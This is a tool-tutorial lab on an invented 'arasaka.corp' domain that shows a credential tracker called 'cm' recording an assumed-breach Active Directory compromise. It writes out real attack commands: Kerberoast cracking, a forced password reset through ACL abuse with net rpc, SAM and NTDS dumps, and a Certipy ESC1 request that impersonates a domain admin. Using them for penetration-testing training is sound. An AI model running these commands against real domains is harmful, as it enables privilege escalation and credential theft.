# Lab 03 — Arasaka (HackSmarter-style assumed breach)

**Range style:** [HackSmarter](https://hacksmarter.io) AD series — an *assumed
breach* start (client hands you a low-priv domain cred) through ACL abuse, NTLM,
and ADCS to Domain Admin.
**Goal:** show the `cm` flows the GOAD labs didn't — `reset` (credentials *you*
introduce), the remediation export, `merge`, and certificate blobs with `unlock`.

> Mock lab in the HackSmarter *style*; the real write-ups site was unreachable
> when this was generated, so names/hashes are invented. Domain: `arasaka.corp`,
> DC `arasaka-dc01`, workstation `night-city-ws` (10.10.10.20).

```bash
export CM_DB=~/engagements/arasaka/engagement.db
cm init
```

---

## Step 1 — The assumed-breach credential

The client gives you a starting account. Record it, then prove it logs in.

```bash
cm cred 'arasaka.corp\david.martinez' --pass 'Samurai2077!' --src 'assumed-breach cred (client-provided)'
cm works 'arasaka.corp\david.martinez' --at arasaka-dc01 --proto smb --priv user
```
```
  + secret #1 plaintext Samurai2077!
  + link arasaka.corp\david.martinez <-> #1 plaintext Samurai2077!
  + access arasaka.corp\david.martinez -> smb/arasaka-dc01 [valid, user]
```

---

## Step 2 — Kerberoast `svc_backup` (via BloodHound) and crack

```bash
cm cred 'arasaka.corp\svc_backup' \
  --hash 'kerberos_tgs:$krb5tgs$23$*svc_backup$ARASAKA.CORP*$deadbeef...' \
  --src 'targetedKerberoast via david.martinez'
cm cracked --from hashcat.potfile       # -> Mikoshi!2023
```

---

## Step 3 — ACL abuse: `reset` a password you now control

BloodHound shows `svc_backup` has **GenericAll** over `goro.takemura`. You force a
new password. This is **your** credential, not one you found — `reset` records it
with origin **`introduced`** (and supersedes any prior secret the account had):

```bash
# attack
net rpc password goro.takemura 'Claude_Reset_2026!' -U arasaka.corp/svc_backup%'Mikoshi!2023' -S arasaka-dc01
```
```bash
cm reset 'arasaka.corp\goro.takemura' --pass 'Claude_Reset_2026!' \
  --src 'ForceChangePassword (GenericAll via svc_backup)'
```
```
  + secret #4 plaintext Claude_Reset_2026!
  + link arasaka.corp\goro.takemura <-> #4 plaintext Claude_Reset_2026! origin=introduced
```

Why the distinction matters: credentials you *introduced* are things you must
**revert and report**. They're kept out of the default `export passwords` reuse
wordlist (they aren't environment passwords), and you can list exactly them later
(Step 9).

---

## Step 4 — Local admin → dump the workstation SAM (local accounts)

`goro` is local admin on `night-city-ws`. Dumping SAM yields **local** accounts →
`--host`.

```bash
cm import samdump --host night-city-ws ws_sam.txt
```
```
  + host night-city-ws
imported: 2 NT hash(es)
```

---

## Step 5 — An `nxc` spray run (watch the realms)

Importing a NetExec run shows how `cm` separates domain from local on the fly: a
`DOMAIN\user` where the domain equals the hostname is treated as a **local**
account, not a bogus domain.

```bash
cm import nxc spray.nxc
```
```
imported: 2 valid login(s) from nxc output
```

The nxc run referenced the box by **IP** (`10.10.10.20`), while Step 4's SAM used
the **hostname** (`night-city-ws`) — so the same local Administrator is now filed
twice:

```bash
cm users | grep -i administrator
```
```
Administrator@night-city-ws
Administrator@10.10.10.20
```

---

## Step 6 — `merge` the split (hostname vs IP = same box)

Fold the IP-keyed identity into the hostname one; its secrets, accesses and
observations move over, and the empty duplicate is removed.

```bash
cm merge 'Administrator@10.10.10.20' 'Administrator@night-city-ws'
```
```
  - merged Administrator@10.10.10.20 into Administrator@night-city-ws (0 secrets, 1 accesses, 0 observations)
```

> Avoid the split in the first place by picking one spelling per host. When it
> happens anyway, `merge` reconciles it.

---

## Step 7 — ADCS ESC1: a PFX, and its passphrase via `unlock`

Certipy abuses a vulnerable template to mint a certificate for a domain admin.
Store the **PFX as a blob**, then link its passphrase with `unlock` — a
secret-to-secret relationship (the passphrase unlocks the key; it isn't a login).

```bash
# attack
certipy req -u david.martinez@arasaka.corp -p 'Samurai2077!' -ca ARASAKA-CA -template VulnTemplate -upn hanako.arasaka@arasaka.corp
```
```bash
cm cred 'arasaka.corp\hanako.arasaka' --pfx hanako.pfx --src 'Certipy ESC1 (ESC1 vuln template)'
cm unlock --pfx '#7' --passphrase 'certipy'
```
```
  + secret #7 certificate_pfx (blob)
  + secret #8 plaintext certipy
  + unlocks #8 plaintext certipy -> #7 certificate_pfx (blob)
[note: passphrase links to the key, not to any login]
```

The passphrase (`#8`) is owned by no identity, so it appears under **loose
secrets** in `cm ls` — correct: it belongs to the *key*, not to a person. Dump the
PFX back out any time with `cm export key '#7' > hanako.pfx`.

---

## Step 8 — Cert → TGT → DCSync

```bash
cm import samdump --domain arasaka.corp arasaka_ntds.txt
```
```
imported: 3 NT hash(es)
```

`hanako.arasaka` now carries her cert **and** her DCSync'd NT hash on one identity:

```bash
cm show user 'arasaka.corp\hanako.arasaka'
```
```
arasaka.corp\hanako.arasaka
  secrets:
    #7 certificate_pfx (blob)
    #11 ntlm caffe00dd11ee22ff33445566778899a
  found via: Certipy ESC1 (ESC1 vuln template), ntds-dump
```

---

## Step 9 — The remediation report (what you must revert)

The single most report-useful query here: **every credential you introduced** —
the password you force-reset — so the client can revert it.

```bash
cm export pairs --introduced
```
```
goro.takemura:Claude_Reset_2026!
```

And the usual payoff views:
```bash
cm where --valid          # confirmed logins (domain + local, deduped after the merge)
cm export pairs --type ntlm   # pass-the-hash list
cm ls                     # full picture incl. '[introduced]' and 'loose secrets'
```

## `cm` features this lab exercised

- **`reset`** — a password *you* set via ACL abuse, recorded as `introduced`
  (and auto-supersedes any prior secret)
- **`export pairs --introduced`** — the revert-this remediation list
- `import nxc` — console output, local-vs-domain realm handling
- **`merge`** — reconcile the same host seen by hostname and by IP
- `cred --pfx` + **`unlock --passphrase`** — certificate blob + its passphrase as a
  secret-to-secret `unlocks` link (shows under *loose secrets*)
- `export key` — write a stored key/pfx/ticket blob back to disk
